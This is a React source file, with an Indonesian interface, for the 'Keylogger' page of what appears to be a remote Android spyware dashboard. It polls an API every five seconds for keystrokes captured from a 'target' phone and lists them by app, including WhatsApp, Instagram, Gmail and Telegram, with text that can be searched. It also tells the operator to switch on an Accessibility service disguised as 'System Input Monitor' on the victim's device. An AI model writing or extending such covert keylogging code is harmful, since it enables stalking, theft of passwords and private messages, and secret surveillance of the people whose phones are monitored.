'use client'
import { useEffect, useState, useCallback } from 'react'
import Sidebar from '@/components/Sidebar'
import { useDevice } from '@/contexts/DeviceContext'
import { KeySquare, RefreshCw, Trash2, Search } from 'lucide-react'

interface Entry {
  id: number
  appName: string
  appPackage: string
  fieldName: string
  text: string
  capturedAt: string
}

const APP_COLORS: Record<string, string> = {
  'com.whatsapp':                      'bg-green-500',
  'com.whatsapp.w4b':                  'bg-green-600',
  'com.instagram.android':             'bg-pink-500',
  'com.facebook.katana':               'bg-blue-600',
  'com.twitter.android':               'bg-sky-500',
  'com.google.android.gm':             'bg-red-500',
  'com.telegram.messenger':            'bg-sky-400',
  'com.google.android.apps.messaging': 'bg-blue-500',
}

function appColor(pkg: string) { return APP_COLORS[pkg] ?? 'bg-android-muted/40' }
function appInitial(name: string) { return name.charAt(0).toUpperCase() }

function timeAgo(iso: string) {
  const diff = Date.now() - new Date(iso).getTime()
  const m = Math.floor(diff / 60000)
  if (m < 1) return 'baru saja'
  if (m < 60) return `${m}m lalu`
  const h = Math.floor(m / 60)
  if (h < 24) return `${h}j lalu`
  return `${Math.floor(h / 24)}h lalu`
}

export default function KeylogPage() {
  const { devices, selectedId, setSelectedId, connected } = useDevice()
  const [entries, setEntries] = useState<Entry[]>([])
  const [loading, setLoading] = useState(true)
  const [search, setSearch]   = useState('')

  const fetchEntries = useCallback(async () => {
    if (!selectedId) return
    setLoading(true)
    try {
      const res  = await fetch(`/api/device/keylog?deviceId=${selectedId}&limit=500`)
      const data = await res.json()
      setEntries(data.entries ?? [])
    } finally { setLoading(false) }
  }, [selectedId])

  const clearAll = async () => {
    if (!selectedId || !confirm('Hapus semua data keylogger?')) return
    await fetch(`/api/device/keylog?deviceId=${selectedId}`, { method: 'DELETE' })
    setEntries([])
  }

  useEffect(() => { fetchEntries() }, [fetchEntries])

  useEffect(() => {
    const t = setInterval(() => { if (selectedId) fetchEntries() }, 5000)
    return () => clearInterval(t)
  }, [selectedId, fetchEntries])

  const filtered  = entries.filter(e =>
    e.appName.toLowerCase().includes(search.toLowerCase()) ||
    e.fieldName.toLowerCase().includes(search.toLowerCase()) ||
    e.text.toLowerCase().includes(search.toLowerCase())
  )

  const apps = [...new Set(filtered.map(e => e.appName))].sort()

  return (
    <div className="flex min-h-screen">
      <Sidebar connected={connected} devices={devices} selectedId={selectedId} onSelect={setSelectedId} />
      <main className="flex-1 page-content overflow-y-auto">
        <div className="max-w-3xl mx-auto px-4 md:px-6 py-4 md:py-6">

          <div className="flex items-center justify-between mb-4">
            <div>
              <h2 className="text-lg md:text-xl font-bold text-white flex items-center gap-2">
                <KeySquare size={20} className="text-android-red" /> Keylogger
              </h2>
              <p className="text-android-muted text-xs mt-0.5">{filtered.length} entri tersimpan · auto-refresh 5s</p>
            </div>
            <div className="flex gap-2">
              <button onClick={fetchEntries} className="p-2 bg-android-surface border border-android-border rounded-lg text-android-muted hover:text-white transition-colors">
                <RefreshCw size={14} />
              </button>
              <button onClick={clearAll} className="p-2 bg-android-surface border border-android-red/30 rounded-lg text-android-red hover:bg-android-red/10 transition-colors">
                <Trash2 size={14} />
              </button>
            </div>
          </div>

          {connected && entries.length === 0 && !loading && (
            <div className="mb-4 p-3 bg-android-yellow/10 border border-android-yellow/30 rounded-xl text-xs text-android-yellow">
              Pastikan <strong>System Input Monitor</strong> sudah diaktifkan:<br />
              Settings → Accessibility → Downloaded Apps → <strong>System Input Monitor</strong> → ON<br />
              <span className="text-android-muted mt-1 block">Jika sudah ON tapi kosong, coba ketik di app manapun di HP target.</span>
            </div>
          )}
          {!connected && (
            <div className="mb-4 p-3 bg-android-surface border border-android-border rounded-xl text-xs text-android-muted">
              Hubungkan device untuk melihat data keylogger.
            </div>
          )}

          <div className="relative mb-4">
            <Search size={14} className="absolute left-3 top-1/2 -translate-y-1/2 text-android-muted" />
            <input
              type="text"
              placeholder="Cari app, field, atau teks…"
              value={search}
              onChange={e => setSearch(e.target.value)}
              className="w-full pl-9 pr-4 py-2.5 bg-android-surface border border-android-border rounded-xl text-sm text-android-text placeholder:text-android-muted focus:outline-none focus:border-android-red"
            />
          </div>

          {apps.length > 1 && (
            <div className="flex gap-2 overflow-x-auto pb-2 mb-4">
              <button onClick={() => setSearch('')} className={`shrink-0 px-3 py-1 rounded-full text-xs font-medium border transition-colors ${search === '' ? 'bg-android-red/10 border-android-red/40 text-android-red' : 'border-android-border text-android-muted hover:text-white'}`}>
                Semua
              </button>
              {apps.map(app => (
                <button key={app} onClick={() => setSearch(app)} className={`shrink-0 px-3 py-1 rounded-full text-xs font-medium border transition-colors ${search === app ? 'bg-android-red/10 border-android-red/40 text-android-red' : 'border-android-border text-android-muted hover:text-white'}`}>
                  {app}
                </button>
              ))}
            </div>
          )}

          {loading ? (
            <div className="text-center py-16 text-android-muted text-sm">Memuat…</div>
          ) : filtered.length === 0 ? (
            <div className="text-center py-16">
              <KeySquare size={40} className="mx-auto text-android-muted/30 mb-3" />
              <p className="text-android-muted text-sm">Belum ada data keylogger</p>
              <p className="text-android-muted/60 text-xs mt-1">Aktifkan Accessibility Access di HP target</p>
            </div>
          ) : (
            <div className="space-y-2">
              {filtered.map(e => (
                <div key={e.id} className="bg-android-surface border border-android-border rounded-xl p-3.5 flex gap-3">
                  <div className={`w-9 h-9 rounded-xl ${appColor(e.appPackage)} flex items-center justify-center shrink-0 text-white text-sm font-bold`}>
                    {appInitial(e.appName)}
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center justify-between gap-2 mb-0.5">
                      <span className="text-xs font-semibold text-android-red truncate">{e.appName}</span>
                      <span className="text-xs text-android-muted shrink-0">{timeAgo(e.capturedAt)}</span>
                    </div>
                    {e.fieldName && (
                      <p className="text-[10px] text-android-muted mb-0.5 font-mono">field: {e.fieldName}</p>
                    )}
                    <p className="text-sm text-android-text font-mono break-all">{e.text}</p>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      </main>
    </div>
  )
}
